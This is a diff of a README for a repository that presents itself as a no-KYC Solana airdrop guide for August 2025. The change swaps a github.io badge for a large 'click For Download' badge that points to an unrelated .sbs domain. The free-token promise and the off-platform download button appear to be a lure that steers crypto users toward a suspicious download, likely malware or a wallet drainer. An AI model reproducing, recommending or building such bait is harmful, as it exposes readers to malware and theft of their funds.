@@ -2,11 +2,15 @@
 
 Welcome to your go-to guide for claiming Solana airdrops without KYC in August 2025! This repository offers educational resources and up-to-date info on legitimate no-KYC Solana airdrops, ensuring your privacy and security remain intact. Learn step-by-step how to identify, register, and claim free SOL tokens without sharing personal data or risking your wallet. This is an open-source, non-automated guide perfect for crypto enthusiasts who value privacy.
 
-<div style="text-align: center">
-  <a href="https://solana-airdrop-no-kyc-august-2025.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Download Badge" src="https://img.shields.io/badge/click_for_visit-Solana_No_KYC_Guide-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 
